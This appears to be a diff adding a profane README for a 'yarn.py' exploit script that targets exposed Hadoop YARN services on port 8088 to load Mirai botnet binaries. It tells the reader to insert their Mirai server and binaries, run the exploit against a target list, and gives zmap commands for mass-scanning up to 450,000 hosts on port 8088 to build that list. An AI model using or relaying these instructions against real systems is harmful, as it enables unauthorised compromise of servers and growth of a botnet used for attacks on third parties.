@@ -1,0 +1,15 @@
+Hello world, fuck my life
+
+1) edit ur fucking yarn.py with your mirai server and your mirai bins
+2) start the yarn exploit trought: python yarn.py mfu.txt
+3) fuck your life
+
+enjoy
+
+
+NOTE: If you want to scan your self mfu.tx
+run trought "zmap"
+
+# zmap -p8088 -omfu.txt -N 450000
+or using the .lst 
+# zmap -p8088 -omfu.txt -w listname.lst
